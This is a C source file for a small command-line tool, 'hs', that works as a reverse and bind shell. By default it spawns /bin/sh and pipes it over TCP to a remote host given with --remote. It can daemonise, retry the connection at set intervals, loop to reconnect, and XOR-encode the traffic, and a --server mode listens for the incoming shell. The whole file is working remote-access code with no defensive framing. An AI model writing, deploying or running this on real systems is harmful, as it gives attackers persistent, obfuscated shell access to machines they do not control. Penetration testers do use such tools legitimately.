
#include <getopt.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "pipe_fd.h"
#include "anet.h"

#define USAGE "Usage: hs [--cmd <cmd>] [--remote <dest>] [--port <port>] [--daemon]\n" \
              "          [--attempts <n>] [--interval <secs>] [--x] [--loop]\n" \
              "       hs [--server] [--port <port>] [--loop] [--x]\n" \
              "       hs [--help]\n"

int main(int argc, char **argv) {

    char *cmd = "/bin/sh";
    char *p = NULL;
    int fd_in = 0, fd_out = 1;
    char *remote = NULL;
    char *bind = NULL;
    char *xor = NULL;
    int port = 9876;
    int server = 0;
    int daemonise = 0;
    int interval = 300;
    int count = 0;
    int attempts = 1;
    int connected = 0;
    int loop = 0;
    int loop_delay = 60;
    //char *pidfile = NULL;

    static struct option longopts[] = {
        { "cmd",        required_argument,  NULL, 'c' },
        { "remote",     required_argument,  NULL, 'r' },
        { "port",       required_argument,  NULL, 'p' },
        { "attempts",   required_argument,  NULL, 'a' },
        { "interval",   required_argument,  NULL, 'i' },
        { "uuid",       optional_argument,  NULL, 'x' },
        { "loop",       no_argument,        NULL, 'l' },
        { "server",     no_argument,        NULL, 's' },
        { "daemon",     no_argument,        NULL, 'd' },
        { "bind",       required_argument,  NULL, 'b' },
        { "help",       no_argument,        NULL, 'h' }
    };

    int i = 0;
    char x,ch;

    while ((ch = getopt_long(argc, argv, "c:r:p:i:xla:n:sdb:h", longopts, NULL)) != -1) {
        switch(ch) {
            case 'c':
                cmd = optarg;
                break;
            case 'r':
                if ((p = strchr(optarg,':')) != NULL) {
                    if ((port = strtol(p+1,(char **)NULL,10)) == 0) {
                        fprintf(stderr,"Invalid port\n");
                        exit(-1);
                    }
                    *p = 0;
                }
                remote = optarg;
                break;
            case 'p':
                if ((port = strtol(optarg,(char **)NULL,10)) == 0) {
                    fprintf(stderr,"Invalid port\n");
                    exit(-1);
                }
                break;
            case 'i':
                if ((interval = strtol(optarg,(char **)NULL,10)) == 0) {
                    fprintf(stderr,"Invalid retry interval\n");
                    exit(-1);
                }
                break;
            case 'x':
                if (optarg) {
                    xor = optarg;
                } else {
                    if ((xor = malloc(1024)) == NULL) {
                        fprintf(stderr,"Cant allocate memory\n");
                        exit(-1);
                    }
                    bzero(xor,1024);
                    if (isatty(fileno(stdin))) {
                        fputs("xor> ",stdout);
                    }
                    while ((x = fgetc(stdin)) != EOF) {
                        if (x == '\n') break;
                        *(xor + i++) = x;
                    }
                }
                break;
            case 'l':
                loop = 1;
                break;
            case 'a':
                if ((attempts = strtol(optarg,(char **)NULL,10)) == 0) {
                    fprintf(stderr,"Invalid attempts\n");
                    exit(-1);
                }
                break;
            case 's':
                server = 1;
                break;
            case 'd':
                daemonise = 1;
                break;
            case 'b':
                bind = optarg;
                break;
            case 'h':
                fprintf(stderr,USAGE);
                exit(-1);
        }
    }

    char err[ANET_ERR_LEN];
    if (server) {
        char c_ip[1024];
        int s_fd,c_fd,c_port;

        if ((s_fd = anetTcpServer(err,port,bind)) == ANET_ERR) {
            fprintf(stderr,"Error creating server: %s",err);
            exit(-1);
        }
        while (1) {
            if ((c_fd = anetAccept(err,s_fd,c_ip,&c_port)) == ANET_ERR) {
                fprintf(stderr,"Error accepting client connection: %s",err);
                exit(-1);
            }
            fprintf(stderr,"--- Connection from: %s port %d\n",c_ip,c_port);
            int fds[4] = {0,1,c_fd,c_fd};
            select_fds(fds,xor);
            fprintf(stderr,"--- Disconnected\n");
            if (!loop) {
                break;
            }
        }
    } else {
        while(1) {
            if (daemonise) {
                if (daemon(0,0) == -1) {
                    perror("Daemon error");
                    exit(-1);
                }
            }
            if (remote) {
                count = 0;
                while (1) {
                    if (count++ > 0) {
                        sleep(interval);
                    }
                    fprintf(stderr,"Connecting - attempt %d\n",count);
                    if ((fd_in = fd_out = anetTcpConnect(err,remote,port)) != ANET_ERR) {
                        connected = 1;
                        break;
                    }
                    if (count >= attempts) {
                        break;
                    }
                }
            } else {
                connected = 1;
            }
            if (connected) {
                pipe_fd_select(cmd,fd_in,fd_out,xor);
                connected = 0;
            }
            if (!loop) {
                break;
            }
            sleep(loop_delay);
        }
    }
    return 0;
}
